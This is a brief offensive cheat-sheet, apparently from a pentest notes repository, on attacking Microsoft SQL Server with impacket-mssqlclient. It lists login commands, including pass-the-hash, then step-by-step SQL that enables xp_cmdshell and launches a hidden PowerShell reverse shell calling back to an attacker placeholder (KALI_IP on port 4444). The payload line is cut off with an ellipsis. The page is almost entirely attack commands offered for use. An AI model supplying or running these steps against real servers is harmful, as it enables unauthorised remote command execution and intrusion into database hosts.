# Using Impacket for SQL
<img width="1024" height="1024" alt="Husky hacker using impacket mssql" src="https://github.com/user-attachments/assets/449787ba-2443-4935-a131-28b64e64ea34" />

## Commands

## impacket-mssqlclient
```
impacket-mssqlclient username:password@target_ip -windows-auth
impacket-mssqlclient domain/username@target_ip -hashes LMHASH:NTHAS
```
Then run these commands in order:
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('KALI_IP',4444);..."'
```
## Note
This also goes with AD, but if you have a first machine with port 1433 open, that's going to be mssql for sure. You just need to get a reverse shell. 
